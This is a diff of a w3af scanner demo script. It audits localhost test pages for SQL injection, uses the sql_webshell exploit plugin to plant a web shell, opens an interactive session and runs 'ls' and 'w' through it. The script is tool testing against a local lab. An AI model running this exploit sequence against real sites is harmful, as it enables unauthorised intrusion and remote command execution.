@@ -1,9 +1,7 @@
-# This is a demo of the attack plugin mysqlWebShell
+# This is a demo of the attack plugin sql_shell
 
 plugins
-
 output console,textFile
-output
 output config textFile
 set fileName output-w3af.txt
 set verbose True
@@ -12,18 +10,26 @@ output config console
 set verbose False
 back
 
-audit sqli, blindSqli
-#discovery webSpider
-#grep pathDisclosure
+audit sqli
+
+discovery webSpider
+discovery config webSpider
+set onlyForward True
+back
 
 back
 target
-set target http://localhost/w3af/blindSqli/blindSqli-str.php?email=f00nes , http://localhost/w3af/img/w3af.png
+set target http://localhost/w3af/audit/sql_injection/select/sql_injection_string.php?name=andres , http://localhost/writable/
 back
+
 start
+
 exploit
-exploit mysqlWebShell
+exploit sql_webshell
+
+interact 0
 ls
 w
-rm w3af_webShell.php
+endInteraction
+
 exit
